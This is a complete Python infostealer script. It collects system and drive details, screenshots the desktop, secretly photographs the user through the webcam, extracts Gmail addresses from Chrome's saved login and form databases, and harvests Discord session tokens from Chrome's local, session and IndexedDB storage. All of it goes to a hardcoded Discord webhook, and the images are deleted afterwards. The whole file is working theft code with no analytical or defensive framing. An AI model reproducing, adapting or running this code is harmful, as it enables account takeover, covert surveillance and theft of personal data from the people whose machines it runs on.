##Besm rab
import os
import platform
import psutil
import requests
import socket
from PIL import ImageGrab
import time
import re


try:
    import cv2
    CAMERA_AVAILABLE = True
except ImportError:
    CAMERA_AVAILABLE = False
    print("Warning: OpenCV not available. Camera functionality will not work.")


WEBHOOK_URL = "https://discord.com/api/webhooks/1405656590324863018/30SslPCt-7AsfkKEq01Oxj8oLbl2Vq6GVF6hRPFiJZ3eyRSMU4I2tQhqIj1hRTNY1LZl"

def get_system_info():
    """Gathers system and drive information."""
    try:
        # --- System ---
        system_info = f"**System Information for {socket.gethostname()}**\n"
        system_info += "```\n"
        system_info += f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
        system_info += f"Processor: {platform.processor()}\n"
        system_info += f"Machine: {platform.machine()}\n"
        system_info += f"Architecture: {' '.join(platform.architecture())}\n"
        
        # --- Drive ---
        system_info += "\nDrive Information\n"
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                system_info += (
                    f"  Drive {partition.device} ({partition.fstype})\n"
                    f"    - Total Size: {usage.total / (1024**3):.2f} GB\n"
                    f"    - Used: {usage.used / (1024**3):.2f} GB\n"
                    f"    - Free: {usage.free / (1024**3):.2f} GB\n"
                    f"    - Usage: {usage.percent}%\n"
                )
            except Exception as e:
                system_info += f"  Could not retrieve info for drive {partition.device}: {e}\n"
        
        system_info += "```"
        return system_info
    
    except Exception as e:
        return f"**An error occurred while gathering system information:** {e}"

def take_screenshot():
    """Take a screenshot and save it to a temporary file."""
    try:
        screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path, 'PNG')
        return screenshot_path
    except Exception as e:
        print(f"An error occurred while taking screenshot: {e}")
        return None

def take_camera_photo():
    """Capture a photo using the system's camera."""
    
    if not CAMERA_AVAILABLE:
        print("Camera functionality not available (OpenCV not installed).")
        return None
    
    try:
        
        cap = cv2.VideoCapture(0)
        
        
        if not cap.isOpened():
            print("Error: Could not open camera.")
            return None
        
        
        time.sleep(2)
        
        
        ret, frame = cap.read()
        
        cap.release()
        
        if ret:
            
            photo_path = os.path.join(os.getenv('TEMP'), 'camera_photo.png')
            cv2.imwrite(photo_path, frame)
            return photo_path
        else:
            print("Error: Could not capture frame.")
            return None
    except Exception as e:
        print(f"An error occurred while taking camera photo: {e}")
        return None

def find_chrome_gmail_addresses():
    """Find Gmail addresses saved in Google Chrome."""
    gmail_addresses = set()
    
    try:
        
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
        
        if not os.path.exists(chrome_path):
            chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default")
        
        
        chrome_files = [
            os.path.join(chrome_path, 'Preferences'),
            os.path.join(chrome_path, 'Secure Preferences'),
            os.path.join(chrome_path, 'Login Data'),
            os.path.join(chrome_path, 'Web Data')
        ]
        
        
        gmail_pattern = re.compile(r'([a-zA-Z0-9._%+-]+@gmail\.com)')
        
        for file_path in chrome_files:
            if os.path.exists(file_path):
                try:
                    
                    if file_path.endswith(('Login Data', 'Web Data')):
                        import sqlite3
                        import tempfile
                        import shutil
                        
                        
                        temp_dir = tempfile.mkdtemp()
                        temp_db_path = os.path.join(temp_dir, os.path.basename(file_path))
                        shutil.copy2(file_path, temp_db_path)
                        
                        
                        conn = sqlite3.connect(temp_db_path)
                        cursor = conn.cursor()
                        
                        
                        try:
                            
                            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                            tables = cursor.fetchall()
                            
                            for table in tables:
                                table_name = table[0]
                                try:
                                    
                                    cursor.execute(f"PRAGMA table_info({table_name});")
                                    columns = cursor.fetchall()
                                    column_names = [col[1] for col in columns]
                                    
                                    
                                    for column_name in column_names:
                                        if 'email' in column_name.lower() or 'user' in column_name.lower() or 'name' in column_name.lower():
                                            try:
                                                cursor.execute(f"SELECT {column_name} FROM {table_name};")
                                                rows = cursor.fetchall()
                                                for row in rows:
                                                    if row[0]:
                                                        matches = gmail_pattern.findall(str(row[0]))
                                                        gmail_addresses.update(matches)
                                            except:
                                                pass
                                except:
                                    pass
                        except:
                            pass
                        
                        conn.close()
                        
                        shutil.rmtree(temp_dir)
                    else:
                        
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            matches = gmail_pattern.findall(content)
                            gmail_addresses.update(matches)
                except Exception as e:
                    
                    pass
        
        
        if gmail_addresses:
            gmail_info = "\nGmail Addresses Found in Chrome\n```\n"
            for address in gmail_addresses:
                gmail_info += f"{address}\n"
            gmail_info += "```"
            return gmail_info
        else:
            return "\nNo Gmail addresses found in Chrome.\n"
    
    except Exception as e:
        return f"\n**An error occurred while searching for Chrome Gmail addresses:** {e}\n"

def find_discord_tokens():
    """Find Discord tokens in Google Chrome's storage."""
    tokens = set()
    
    try:
        
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
        
        if not os.path.exists(chrome_path):
            
            chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data")
        
        
        if not os.path.exists(chrome_path):
            return "\nChrome data directory not found.\n"
        
        
        token_pattern = re.compile(r'([a-zA-Z0-9_-]{24,30}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38})')
        
        
        for root, dirs, files in os.walk(chrome_path):
            
            dirs[:] = [d for d in dirs if not d.startswith('.') and not d.startswith('System') and not d.startswith('Snapshot')]
            
            
            if os.path.basename(root) in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'] or root.endswith('Default') or 'Profile' in root:
                
                local_storage_path = os.path.join(root, 'Local Storage', 'leveldb')
                if os.path.exists(local_storage_path):
                    for file_name in os.listdir(local_storage_path):
                        if file_name.endswith('.log') or file_name.endswith('.ldb'):
                            file_path = os.path.join(local_storage_path, file_name)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    matches = token_pattern.findall(content)
                                    tokens.update(matches)
                            except Exception as e:
                                
                                pass
                
                
                indexeddb_path = os.path.join(root, 'IndexedDB')
                if os.path.exists(indexeddb_path):
                    for db_dir in os.listdir(indexeddb_path):
                        if db_dir.startswith('https_discord.com_'):
                            db_path = os.path.join(indexeddb_path, db_dir)
                            if os.path.isdir(db_path):
                                for file_name in os.listdir(db_path):
                                    if file_name.endswith('.log') or file_name.endswith('.ldb'):
                                        file_path = os.path.join(db_path, file_name)
                                        try:
                                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                                content = f.read()
                                                matches = token_pattern.findall(content)
                                                tokens.update(matches)
                                        except Exception as e:
                                            
                                            pass
                
                
                session_storage_path = os.path.join(root, 'Session Storage')
                if os.path.exists(session_storage_path):
                    for file_name in os.listdir(session_storage_path):
                        if file_name.endswith('.log') or file_name.endswith('.ldb'):
                            file_path = os.path.join(session_storage_path, file_name)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    matches = token_pattern.findall(content)
                                    tokens.update(matches)
                            except Exception as e:
                                
                                pass
        
        
        if tokens:
            token_info = "\nDiscord Tokens Found in Chrome\n```\n"
            for token in tokens:
                token_info += f"{token}\n"
            token_info += "```"
            return token_info
        else:
            return "\nNo Discord tokens found in Chrome.\n"
    
    except Exception as e:
        return f"\n**An error occurred while searching for Discord tokens:** {e}\n"

def send_to_discord(webhook_url, message, file_paths=None):
    """Send message and optional files to Discord webhook."""
    if not message:
        print("Message is empty, not sending.")
        return
    
    try:
        if file_paths and isinstance(file_paths, list):
            
            data = {"content": message}
            
            files = []
            for file_path in file_paths:
                if os.path.exists(file_path):
                    files.append(('file', (os.path.basename(file_path), open(file_path, 'rb'))))
            
            if files:
                response = requests.post(webhook_url, data=data, files=files)
                
                for _, (_, f) in files:
                    f.close()
            else:
                response = requests.post(webhook_url, data=data)
        elif file_paths and os.path.exists(file_paths):
            with open(file_paths, 'rb') as f:
                files = {'file': (os.path.basename(file_paths), f)}
                data = {"content": message}
                response = requests.post(webhook_url, data=data, files=files)
        else:
        
            data = {"content": message}
            response = requests.post(webhook_url, data=data)
        
        response.raise_for_status()
        print("Successfully sent information to Discord.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send information to Discord: {e}")

def main():
    """Main function to collect all information and send to Discord."""
    print("Collecting system information...")
    
    
    system_info = get_system_info()
    
    
    print("Searching for Gmail addresses in Chrome...")
    gmail_info = find_chrome_gmail_addresses()
    
    
    print("Searching for Discord tokens in Chrome...")
    discord_info = find_discord_tokens()
    
    
    full_info = system_info + gmail_info + discord_info
    
    
    print("Taking screenshot...")
    screenshot_path = take_screenshot()
    
   
    print("Taking camera photo...")
    photo_path = take_camera_photo()
    
    
    print("Sending information to Discord...")
    
    file_paths = []
    if screenshot_path and os.path.exists(screenshot_path):
        file_paths.append(screenshot_path)
    if photo_path and os.path.exists(photo_path):
        file_paths.append(photo_path)
    
    send_to_discord(WEBHOOK_URL, full_info, file_paths)
    
    
    try:
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)
        if photo_path and os.path.exists(photo_path):
            os.remove(photo_path)
    except Exception as e:
        print(f"Error cleaning up files: {e}")

if __name__ == "__main__":
    main()

##Bedrood -- haj c0mrade
